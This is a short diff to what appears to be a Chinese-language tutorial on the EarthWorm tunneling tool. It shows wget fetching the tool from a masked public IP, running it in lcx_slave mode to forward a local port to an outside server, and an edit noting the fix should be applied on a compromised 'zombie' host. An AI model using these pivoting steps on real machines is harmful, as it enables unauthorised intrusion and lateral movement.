@@ -51,7 +51,7 @@ wget -p /tmp http://45.\*.\*.190/ew_for_linux
 [root@localhost 45.*.*.190]# ./ew_for_linux -s lcx_slave  -d 45.*.*.190 -e 8888    -f 127.0.0.1  -g  6522
 -bash: ./ew_for_linux: /lib/ld-linux.so.2: bad ELF interpreter: 没有那个文件或目录
 ```
-> 解决方案yum install glibc.i686
+> 解决方案到肉鸡上：yum install glibc.i686，那么如果肉鸡上没有安装权限可能就要换工具了
 
 ### 公网服务器监听端口转发8888
 ` ./ew_for_linux -s lcx_listen -l  8888   -e 8889`
